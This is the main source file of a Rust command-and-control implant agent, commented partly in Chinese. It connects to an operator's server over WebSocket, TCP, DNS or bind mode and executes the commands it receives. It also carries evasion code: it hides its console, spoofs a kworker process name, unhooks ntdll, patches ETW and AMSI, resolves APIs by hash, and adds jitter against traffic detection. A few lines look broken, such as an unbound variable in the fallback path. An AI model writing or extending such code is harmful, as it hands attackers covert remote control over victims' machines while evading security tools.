// C2 Client Agent - 主程序入口
//
// 这是一个轻量级的 C2 受控端程序，通过多种传输协议连接到服务端，
// 接收并执行命令，然后将结果返回给服务端。
//
// 核心特性：
// - 多协议支持（WebSocket、TCP、DNS 等）
// - 条件编译：使用 Cargo Features 按需编译协议
// - 指数退避自动重连
// - 零 panic 错误处理
// - 跨平台命令执行
// - 异步 I/O
// - 可修补的服务器配置

#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

#[allow(unused_imports)]
use cupcake_core::{stealth, Result};
#[allow(unused_imports)]
use log::info;

#[cfg(target_os = "linux")]
fn daemonize() {
    unsafe {
        // 第一阶段 fork：创建子进程
        match libc::fork() {
            -1 => return,               // 错误
            0 => {}                     // 子进程继续
            _ => std::process::exit(0), // 父进程退出
        }

        // 创建新会话，摆脱控制终端
        libc::setsid();

        // 第二阶段 fork：确保不会重新获取控制终端
        match libc::fork() {
            -1 => return,
            0 => {}
            _ => std::process::exit(0),
        }

        // 重定向标准流到 /dev/null
        if let Ok(dev_null) = std::fs::File::open("/dev/null") {
            use std::os::unix::io::AsRawFd;
            let fd = dev_null.as_raw_fd();
            libc::dup2(fd, 0);
            libc::dup2(fd, 1);
            libc::dup2(fd, 2);
        }
    }
}

/// TEMP DIAG (remove after E2E): file trace gated on CUPCAKE_TRACE=1.
fn trace(msg: &str) {
    if std::env::var("CUPCAKE_TRACE").is_ok() {
        use std::io::Write;
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open("agent_trace.log")
        {
            let _ = writeln!(f, "{}", msg);
            let _ = f.flush();
        }
    }
}

fn main() {
    trace("enter main");
    // 🚀 Linux 自主后台化 (Daemonization)
    #[cfg(target_os = "linux")]
    daemonize();

    // Diagnostics: release ignores RUST_LOG unless AGENT_ALLOW_DIAG=1
    let logging_enabled = {
        let allow = std::env::var("AGENT_ALLOW_DIAG")
            .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
            .unwrap_or(false);
        if cfg!(debug_assertions) {
            true
        } else if allow {
            std::env::var("RUST_LOG").is_ok()
        } else {
            false
        }
    };

    if logging_enabled {
        #[cfg(target_os = "windows")]
        stealth::setup_diagnostic_console();

        // Initialize env_logger only when the `logging` feature is compiled in.
        #[cfg(feature = "logging")]
        {
            env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
                .init();
        }
    }

    // 💥 Global Panic Hook
    std::panic::set_hook(Box::new(|info| {
        trace(&format!("PANIC: {:?}", info));
        log::error!("PANIC OCCURRED: {:?}", info);
    }));
    trace("panic hook set");

    // Seed PRNG
    let seed = match std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
        Ok(d) => d.as_nanos() as u64,
        Err(_) => 0x1337BEEF1337BEEF_u64,
    };
    cupcake_core::utils::seed_rng(seed);
    trace("rng seeded");

    // 3. [Debug] DON'T Hide Console if logging is active
    if !logging_enabled {
        trace("before hide_console");
        stealth::hide_console();
        trace("after hide_console");
    } else {
        trace("diag mode: hide_console skipped");
        log::info!("hide_console skipped (diag mode)");
    }

    // 3.5 [Windows] Relax CFG for this process — required for indirect calls
    // into Manual-Mapped L2 modules (classic in-process BOF engine).
    #[cfg(target_os = "windows")]
    {
        trace("before relax_cfg_self");
        stealth::relax_cfg_self();
        trace("after relax_cfg_self");
    }

    // 4. Optional ETW/AMSI — ONLY with feature stealth-adv (full profile).
    // Default minimal/standard must NEVER enable this (high EDR signature).
    #[cfg(all(target_os = "windows", feature = "stealth-adv"))]
    unsafe {
        let _ = stealth::unhook_ntdll();
        stealth::patch_etw();
        stealth::patch_amsi();
    }
    #[cfg(all(target_os = "windows", feature = "stealth-adv"))]
    {
        // Compile-time note for operators grepping features
        const _: () = ();
    }

    // 5. COM Initialization for PTY support (dynamic resolve — no combase IAT)
    #[cfg(target_os = "windows")]
    {
        trace("before COM init");
        unsafe {
            // COINIT_MULTITHREADED = 0x0
            // Console agents often lack ole32/combase until LoadLibrary.
            type CoInitializeExFn =
                unsafe extern "system" fn(*mut winapi::ctypes::c_void, u32) -> i32;
            let mut done = false;
            for dll in [b"combase.dll".as_slice(), b"ole32.dll".as_slice()] {
                let base = cupcake_core::stealth::ensure_module_base(
                    dll,
                    cupcake_core::stealth::hash_module_name(dll),
                );
                if base == 0 {
                    continue;
                }
                if let Some(addr) = cupcake_core::stealth::get_api_addr(
                    base,
                    cupcake_core::stealth::hash_api_name(b"CoInitializeEx"),
                ) {
                    let f: CoInitializeExFn = std::mem::transmute(addr);
                    let _ = f(std::ptr::null_mut(), 0);
                    done = true;
                    break;
                }
            }
            if !done {
                cupcake_core::utils::db_print("[WARN] CoInitializeEx not resolved");
            }
        }
        trace("after COM init");
    }

    // 9. Backgrounding and Name Spoofing (Linux)
    // 🛡️ Phase 1 Enhancement: Use randomized kworker name instead of fixed name
    #[cfg(target_os = "linux")]
    {
        // Use empty string to trigger random name generation
        stealth::spoof_process_name("");
    }

    // 11. Spawn agent runtime thread
    #[cfg(target_os = "windows")]
    {
        unsafe extern "system" fn agent_thread_proc(_: *mut winapi::ctypes::c_void) -> u32 {
            trace("thread proc enter");
            let rt = match build_runtime() {
                Ok(r) => {
                    trace("runtime built");
                    r
                }
                Err(e) => {
                    trace(&format!("runtime build FAILED: {}", e));
                    cupcake_core::utils::db_print(&format!(
                        "[FATAL] Failed to create tokio runtime: {}",
                        e
                    ));
                    return 1;
                }
            };

            trace("before run()");
            rt.block_on(async {
                if let Err(e) = run().await {
                    trace(&format!("run() returned err: {:?}", e));
                    cupcake_core::utils::db_print(&format!(
                        "[FATAL] Agent run loop failed: {:?}",
                        e
                    ));
                }
            });
            trace("after run()");

            0
        }

        // Prefer NtCreateThreadEx (syscall); no CreateThread IAT dependency.
        // stack_size=0 → OS default (do NOT pass large commit with 0 reserve:
        // Server 2012 R2 / Win8.1 reject or mis-handle commit>reserve).
        trace("before create_thread_ex");
        let h_thread = match cupcake_core::native::create_thread_ex(
            agent_thread_proc,
            std::ptr::null_mut(),
            0,
        ) {
            Ok(h) => {
                trace(&format!("create_thread_ex ok h={:#x}", h));
                h
            }
            Err(e) => {
                trace(&format!("create_thread_ex FAILED: {}", e));
                cupcake_core::utils::db_print(&format!("[FATAL] NtCreateThreadEx failed: {}", e));
                return;
            }
        };

        // Wait indefinitely for agent thread
        trace("before wait_for_single_object");
        cupcake_core::native::wait_for_single_object(h_thread);
        trace("after wait_for_single_object");
        let _ = cupcake_core::native::close_handle(h_thread);
    }
    #[cfg(not(target_os = "windows"))]
    {
        let rt = match build_runtime() {
            Ok(r) => r,
            Err(_) => return,
        };
        rt.block_on(async {
            let _ = run().await;
        });
    }
}

/// Build Tokio runtime: multi-thread when `rt-multi` feature is on, else current-thread (smaller).
fn build_runtime() -> std::result::Result<tokio::runtime::Runtime, std::io::Error> {
    #[cfg(feature = "rt-multi")]
    {
        tokio::runtime::Builder::new_multi_thread()
            .enable_all()
            .build()
    }
    #[cfg(not(feature = "rt-multi"))]
    {
        tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
    }
}

/// 主运行逻辑
async fn run() -> Result<()> {
    // 💤 1. Sleep Delay (legacy path if module-loader without post-ex; product minimal uses sleep_time)
    #[cfg(all(feature = "module-loader", not(feature = "post-ex")))]
    {
        let delay_ms = cupcake_core::module_loader::stage0_startup_delay_ms();
        cupcake_core::utils::db_print(&format!(
            "[agent] Stage0 startup delay {} ms (OPSEC jitter)",
            delay_ms
        ));
        crate::stealth::stealth_sleep(delay_ms as u32).await;
    }
    #[cfg(not(all(feature = "module-loader", not(feature = "post-ex"))))]
    {
        let sleep_secs = cupcake_core::config::get_sleep_time();
        if sleep_secs > 0 {
            tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
        }
    }

    // 🆔 预计算并缓存 Agent UUID
    cupcake_core::get_agent_uuid();

    // 1️⃣ WebSocket Entry Point
    #[cfg(feature = "ws")]
    {
        return run_websocket_mode().await;
    }

    // 2️⃣ TCP Entry Point (Medium Priority)
    #[cfg(all(feature = "tcp", not(feature = "ws")))]
    {
        return run_tcp_mode().await;
    }

    // 3️⃣ DNS Entry Point (Lowest Priority)
    #[cfg(all(
        feature = "dns",
        not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))
    ))]
    {
        return run_dns_mode().await;
    }

    // 4️⃣ TCP Bind Entry Point (New)
    #[cfg(feature = "tcp_bind")]
    {
        info!("Running in TCP Bind (Forward) mode");
        return run_bind_mode().await;
    }

    // ⚠️ Safety check: What if no feature is selected?
    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns", feature = "tcp_bind")))]
    {
        return Err(ClientError::ConnectionError("no_protocol".to_string()));
    }
}

/// WebSocket 模式运行逻辑
#[cfg(feature = "ws")]
#[allow(dead_code)]
async fn run_websocket_mode() -> Result<()> {
    use cupcake_core::config::{get_server_url, validate_server_url};
    use cupcake_core::fallback::{FallbackManager, FallbackState};
    use cupcake_core::transport::create_transport;
    use cupcake_core::{ClientError, Transport};

    let server_url = get_server_url();
    trace(&format!("ws mode: server_url={}", server_url));
    // println!("[*] Target C2 Server: {}", server_url);

    if !validate_server_url(&server_url) {
        trace("ws mode: URL validation FAILED");
        return Err(ClientError::ConnectionError("invalid_target".to_string()));
    }

    let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
        Ok(t) => {
            trace("ws mode: transport created");
            t
        }
        Err(e) => {
            trace(&format!("ws mode: transport create FAILED: {:?}", e));
            return Err(e);
        }
    };

    // 🛡️ Phase 3: Initialize Fallback Manager
    let mut fallback = FallbackManager::new();

    // 使用指数退避重连策略（1s -> 2s -> 4s -> ... -> 60s）
    let mut backoff = cupcake_core::ExponentialBackoff::new();

    loop {
        // 🛡️ Phase 3: Check fallback state and adapt
        let current_url = match fallback.state() {
            FallbackState::Primary => server_url.clone(),
            FallbackState::DnsBackup => {
                if let Some(dns_url) = fallback.switch_to_fallback() {
                    dns_url
                } else {
                    server_url.clone()
                }
            }
            FallbackState::WaitingRecovery => {
                // Wait before recovery attempt
                let recovery_delay = fallback.recovery_delay_secs();
                log::info!("Waiting {}s before recovery attempt", recovery_delay);
                tokio::time::sleep(tokio::time::Duration::from_secs(recovery_delay)).await;

                if let Some(primary_url) = fallback.attempt_recovery() {
                    // Recreate transport for recovery
                    match create_transport(&primary_url) {
                        Ok(t) => {
                            transport = t;
                            primary_url
                        }
                        Err(_) => {
                            continue;
                        }
                    }
                } else {
                    server_url.clone()
                }
            }
        };

        if let Err(_e) = transport.connect().await {
            trace("ws mode: connect failed");
            // 🛡️ Phase 3: Primary failed - try fallback
            if *fallback.state() == FallbackState::Primary {
                if let Some(_fallback_url) = fallback.switch_to_fallback() {
                    #[cfg(feature = "dns")]
                    {
                        log::info!("Switching to DNS backup channel");
                        match create_transport(&fallback_url) {
                            Ok(t) => {
                                transport = t;
                                backoff.reset();
                                continue;
                            }
                            Err(_) => {
                                log::warn!("Fallback channel also failed");
                            }
                        }
                    }
                }
            }

            // 连接失败：使用指数退避等待
            tokio::time::sleep(backoff.next_delay()).await;
            continue;
        }

        // 🛡️ Phase 3: Mark as recovered if on primary
        if *fallback.state() == FallbackState::Primary {
            fallback.mark_recovered();
        }

        // 连接成功：重置退避计时器
        backoff.reset();
        trace(&format!("ws mode: CONNECTED to {}", current_url));

        #[cfg(feature = "plugin")]
        let run_result = {
            let handler = cupcake_core::BatchMessageHandler::new(transport, None);
            handler.run().await
        };
        #[cfg(not(feature = "plugin"))]
        let run_result = {
            let handler = cupcake_core::MessageHandler::new(transport);
            handler.run().await
        };

        // Session ended — clear staged worker PE / supervisor bookkeeping.
        cupcake_core::module_supervisor::supervisor().stop_all();

        match run_result {
            Ok(returned_transport) => {
                transport = returned_transport;
                // Connection dropped but recovered - mark primary as recovered
                fallback.mark_recovered();
            }
            Err(_e) => {
                // 🛡️ Phase 3: Session error - may need fallback
                fallback.switch_to_fallback();

                match create_transport(&current_url) {
                    Ok(t) => transport = t,
                    Err(e) => return Err(e),
                }
            }
        }
        // Session 断开：短暂等待后重连
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    }
}

/// TCP 模式运行逻辑
#[cfg(feature = "tcp")]
#[allow(dead_code)]
async fn run_tcp_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let server_url = get_server_url();
    let mut clean_url = server_url.clone();

    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    }

    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    let tcp_url = format!("tcp://{}", clean_url);

    let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
        Ok(t) => t,
        Err(e) => {
            return Err(e);
        }
    };

    // 使用指数退避重连策略（与 WS 模式一致）
    let mut backoff = cupcake_core::ExponentialBackoff::new();

    loop {
        if let Err(_) = transport.connect().await {
            let delay = backoff.next_delay();
            // 添加抖动避免流量模式识别
            let jitter_ms = cupcake_core::utils::random_range(0, 3000) as u64;
            tokio::time::sleep(delay + tokio::time::Duration::from_millis(jitter_ms)).await;
            continue;
        }

        // 连接成功：重置退避
        backoff.reset();

        let handler = MessageHandler::new(transport);

        match handler.run().await {
            Ok(returned_transport) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = returned_transport;
            }
            Err(_) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                loop {
                    match create_transport(&tcp_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            let delay = backoff.next_delay();
                            tokio::time::sleep(delay).await;
                        }
                    }
                }
            }
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}

/// DNS 模式运行逻辑
#[cfg(feature = "dns")]
#[allow(dead_code)]
async fn run_dns_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let server_url = get_server_url();

    let mut clean_url = server_url.clone();

    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("dns://") {
        clean_url = clean_url.replace("dns://", "");
    }

    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    let dns_url = format!("dns://{}", clean_url);

    let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
        Ok(t) => t,
        Err(e) => return Err(e),
    };

    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
            continue;
        }

        let handler = MessageHandler::new(transport);

        match handler.run().await {
            Ok(returned_transport) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = returned_transport;
            }
            Err(_) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                loop {
                    match create_transport(&dns_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
                        }
                    }
                }
            }
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
    }
}
/// TCP Bind (正向监听) 模式运行逻辑
#[cfg(feature = "tcp_bind")]
async fn run_bind_mode() -> Result<()> {
    use cupcake_core::config::get_server_url;
    use cupcake_core::handler::MessageHandler;
    use cupcake_core::transport::{create_transport, Transport};

    let bind_addr = get_server_url();
    let mut clean_url = bind_addr.clone();

    // 清除一切可能的前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    } else if clean_url.starts_with("bind://") {
        clean_url = clean_url.replace("bind://", "");
    }

    // 清除路径部分 (如 /ws)
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }

    // Preserve the configured bind host. Default to loopback when only a port
    // is given; explicit 0.0.0.0 must be chosen by the operator so bind mode
    // does not silently expose a control listener on every interface.
    let (host, port) = if let Some(idx) = clean_url.rfind(':') {
        let h = &clean_url[..idx];
        let p = &clean_url[idx + 1..];
        if h.is_empty() {
            ("127.0.0.1", p)
        } else {
            (h, p)
        }
    } else {
        ("127.0.0.1", clean_url.as_str())
    };
    let bind_url = format!("bind://{}:{}", host, port);

    let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;

    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            continue;
        }

        let handler = MessageHandler::new(transport);
        match handler.run().await {
            Ok(returned_transport) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = returned_transport;
            }
            Err(_) => {
                cupcake_core::module_supervisor::supervisor().stop_all();
                transport = create_transport(&bind_url)?;
            }
        }
    }
}
